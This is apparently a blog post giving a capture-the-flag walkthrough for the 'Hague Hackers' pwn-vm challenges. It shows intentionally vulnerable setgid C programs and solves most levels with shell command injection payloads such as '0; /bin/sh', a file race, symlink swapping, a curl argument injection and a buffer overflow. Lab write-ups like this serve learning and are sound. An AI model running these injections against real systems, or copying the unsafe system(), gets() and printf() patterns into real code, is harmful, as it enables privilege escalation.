---
layout: post
title: "Hague Hackers pwn-vm"
date: 2024-11-18 +0200
categories: jekyll update
---
![](https://ketho.github.io/data/img/haguehackers.png)

These are the `pwn-vm` challenges from Hague Hackers.

- `user: pwn`
- `pass: pwn123`
- To continue between challenges, run `./levelup`and then reconnect via ssh to get the proper access rights

## level 0
`level0.c`
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    int gid = getegid();
    if(argc < 3) {
        puts("USAGE: ./level0 arg1 arg2");
        exit(0);
    }
    if((strncmp(argv[1],"ea5y_chaLL3ng3", 14))||(strncmp(argv[2],"eaSy_p34sy", 10))){
        puts("Try again!");
    }
    else {
        if(getenv("level0")){
            setresgid(gid,gid,gid);
            execve("/bin/bash", 0, 0);
        }
        else {
            puts("Maybe next time..");
        }
    }
    return 0;
}
```
We need to [set](https://stackoverflow.com/questions/234742/setting-environment-variables-in-linux-using-bash) an environment variable `level0` and pass two correct strings to the program
```sh
export level0=foo
./level0 ea5y_chaLL3ng3 eaSy_p34sy
```

## level 1
`level1.c`
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char command[60];
    int gid = getegid();
    snprintf(command, "/bin/print %s !", getenv("level1"), 60);
    setresgid(gid,gid,gid);
    system(command);
    return 0;
}
```
Here we can use command injection, for example this just prints `0` and then opens `/bin/sh`
```sh
export level1='0; /bin/sh'
./level1
./levelup
```

## level 2
`level2.c`
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
int sanitycheck(char * s) {
    if((strchr(s, ';'))||(strchr(s, '&'))||(strchr(s, '|'))||(strchr(s, '<'))||(strchr(s, '>'))){
        puts("Illegal");
        exit(1);
    }
    return 0;
}
int main(int argc, char * argv[]){
    char command[60];
    int gid = getegid();
    if(argc < 2) {
        puts("USAGE: ./level2 arg1");
        exit(0);
    }
    sanitycheck(argv[1]);
    snprintf(command,60, "/usr/bin/choom -n %s", argv[1]);
    printf("Executing command: %s", command);
    setresgid(gid,gid,gid);
    execve("/bin/bash", 0, 0);
    return 0;
}
```
This program is kind of bugged how it works so we can pass anything to it really
```sh
./level2 a
./levelup
```

The idea with [choom](https://man7.org/linux/man-pages/man1/choom.1.html) was we were actually supposed to set value of 0 to a certain process and then launch /bin/sh

## level 3
`level3.c`
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char * argv[]){
    FILE* fp;
    char command[64];
    char output[20];
    int gid = getegid();
    if(argc < 3) {
        puts("USAGE: ./level0 arg1 arg2");
        exit(0);
    }
    snprintf(command, 64, "/usr/bin/python3 ./script.py %s %s 2>/dev/null", argv[1], argv[2]);
    fp = popen(command, "r");
    if (fp == NULL) {
        puts("Failed to run command");
        exit(1);
    }
    fgets(output, sizeof(output), fp);
    puts(output);
    if(!strncmp(output, "301", 3)){
        setresgid(gid,gid,gid);
        execve("/bin/bash", 0, 0);
    }
}
```

`script.py`
```py
import requests
import sys
URL = "http://"+sys.argv[1]+":"+sys.argv[2]
r = requests.get(URL)
print(r.status_code)
```
We can again use command injection to get to `/bin/bash`
```sh
./level3 a '; echo 301'
./levelup
``` 

Alternatively, I hosted a nodejs web server on my machine (192.168.56.104) to return status code 301 and then ran `./level3 192.168.56.1 3000`
```js
const http = require('http');

const hostname = '192.168.56.104';
const port = 3000;

const server = http.createServer((req, res) => {
  res.statusCode = 301;
  res.end();
});

server.listen(port, hostname, () => {
  console.log(`Server running at http://${hostname}:${port}/`);
});
```

## level 4
`level4.c`
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char * argv[]){
    FILE* fd;
    char out[20];
    int gid = getegid();
    fd = fopen("./level4_x78ezf", "w+");
    if (fd == NULL) {
        puts("Failed to open file");
        exit(1);
    }
    fprintf(fd,"%s","level4_is_fUn");
    fclose(fd);
    sleep(2);
    fd = fopen("./level4_x78ezf", "r");
    fgets(out,20, fd);
    puts(out);
    if(!strncmp(out, "level4_1s_4maZinG", 17)){
        setresgid(gid,gid,gid);
        execve("/bin/bash", 0, 0);
    }
    fclose(fd);
    return 0;
}
```
The binary writes `level4_is_fUn` to the `level4_x78ezf` file, sleeps for two seconds with `sleep(2)` and then reads if the content matches `level4_1s_4maZinG`. So in those two seconds we should somehow edit the contents of that file to `level4_1s_4maZinG`. This can be done with e.g. a second terminal.
- Run `./level4` first
- In a second terminal quickly run `echo level4_1s_4maZinG > ~/level4/level4_x78ezf`
- `./levelup`

## level 5
`level5.c`
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>

int main(int argc, char * argv[]){
    FILE* fp;
    char command[64];
    char output[32];
    int gid = getegid();
    if(argc < 2) {
        puts("USAGE: ./level5 arg1");
        exit(0);
    }
    snprintf(command, 64, "/usr/bin/md5sum %s 2>/dev/null", argv[1]);
    fp = popen(command, "r");
    fgets(output, 33, fp);
    puts(output);
    if(!strncmp(output, "e522e97c1e99a41f693aec0fb3c127cb", 32)){
        puts("Great!");
        setresgid(gid,gid,gid);
        execve("/bin/bash", 0, 0);
    }
    return 0;
}
```
The program wants a file with a certain md5 hash. One way is to print all the hashes of the files in the `images` folder.

Show all md5sums of files in current directory
- `find images -type f -exec md5sum {} +`
Filters the output for only a specific hash
- `find images -type f -exec md5sum {} + | grep e522e97c1e99a41f693aec0fb3c127cb`
    - `e522e97c1e99a41f693aec0fb3c127cb  images/345.jpg`
```sh
./level5 images/345.jpg
./levelup
```

## level 6
`level6.c`
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>

int main(int argc, char * argv[]){
    int gid = getegid();
    setresgid(gid,gid,gid);
    execve("/home/pwn/level6/whoami", 0, 0);
    return 0;
}
```
When checking `ls -la` we notice we have full rights on `/home/pwn/level6/whoami`
So we can make abuse this by making a symlink from `/home/pwn/level6/whoami` to `levelup`. Note that we have to delete this `whoami` file first.
```sh
rm whoami
ln -s levelup whoami
./level6
```

## level 7
`level7.c`
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>

int main(int argc, char * argv[]){
    FILE* fd;
    int gid;
    int choice;
    char secret[60];
    char real_secret[60];
    puts("1) get a shell");
    puts("2) submit secret");
    scanf("%d", &choice);
    if(choice == 1){
        gid = getegid();
        setresgid(gid,gid,gid);
        execve("/home/pwn/level7/shell", 0, 0);
    }
    else{
        fd = fopen("./secret", "r");
        fgets(real_secret,60, fd);
        read(0, secret, 60);
        if(!strncmp(secret,real_secret,19)){
                gid = getegid();
                setresgid(gid,gid,gid);
                execve("/bin/bash", 0, 0);
        }else { puts("good bye");}
    }
    return 0;
}
```
This is quite a funny challenge, when checking the file permissions with `ls -la`. It's sufficient to just open the shell and levelup.
- Choose the first option: `1) get a shell`
- Enter `./levelup`

## level 8
`level8.c`
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>

int main(){
    int gid = getegid();
    FILE* fp;
    FILE* fd;
    char command[400];
    char output[20];
    char input[300];
    fd = fopen("./input", "r");
    fgets(input,300, fd);
    puts(input);
    snprintf(command, 400, "/usr/bin/curl http://localhost:5000%s", input);
    fp = popen(command, "r");
    if (fp == NULL) {
        puts("Failed to run command");
        exit(1);
    }
    fgets(output, sizeof(output), fp);
    puts(output);
    if(!strncmp(output, "correct", 7)){
        setresgid(gid,gid,gid);
        execve("/bin/bash", 0, 0);
    }
    return 0;
}
```

`input`
```sh
/getflag -X PUT -d '{"secret":"sup3r_secret_49856231"}' -H 'Content-Type:application/json'
```

`app.py`
```py
from flask import Flask,request
from dotenv import load_dotenv
import os

load_dotenv()


app = Flask(__name__)

@app.route('/')
def hello_world():
    return 'Hello'

@app.route('/getflag',methods = ['GET','PUT'])
def get_flag():
    secret = os.getenv("MY_SECRET")
    if request.method == 'PUT' and request.json['secret'] == secret:
        return "correct"
    return "wrong"

if __name__ == '__main__':
    app.run(debug=False, port=5000, host='0.0.0.0')
```

`Dockerfile`
```dockerfile
FROM python:3.8-alpine

WORKDIR /app
RUN pip install flask python-dotenv
COPY app.py /app
COPY .env /app
ENTRYPOINT [ "python" ]
EXPOSE 5000
CMD [ "app.py" ]
```

`run.sh`
```sh
docker run -d -p 5000:5000 app
```

There are a lot of interesting files inside level 8, noticeably `Dockerfile`, `input` and `run.sh`.

If we run `./run.sh` then it runs the Docker app on localhost port 5000, this can be verified with curl:
- `/usr/bin/curl http://localhost:5000/` shows "Hello"
- `/usr/bin/curl -X PUT http://localhost:5000/getflag -H "Content-Type: application/json" -d '{"secret": "sup3r_secret_49856231"}'` shows "correct"

So the program runs the latter command which should return "correct" and then runs `/bin/bash`. To summarize:
```sh
./run.sh
./level8
./levelup
```

## level 9
`level9.c`
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char * argv[]){
    int target = 0x0;
    char input[60];
    int gid;
    puts("input: ");
    gets(input);
    if(target != 0){
        gid = getegid();
        setresgid(gid,gid,gid);
        execve("/bin/bash", 0, 0);
    }
    else {
        puts("good bye");
    }
    return 0;
}
```
We can overflow the buffer with 77 or more chars
- `./level9`
    - input: `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`
- `./levelup`

## level 10
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char * argv[]){
    FILE* fd;
    char secret[60];
    char real_secret[60];
    int gid = getegid();
    fd = fopen("./secret", "r");
    fgets(real_secret,60, fd);
    puts("secret: ");
    read(0, secret, 60);
    printf(secret);
    if(!strncmp(secret, real_secret, 12)){
        setresgid(gid,gid,gid);
        execve("/bin/bash", 0, 0);
    }
    return 0;
}
```

This binary should be vulnerable to format string attacks
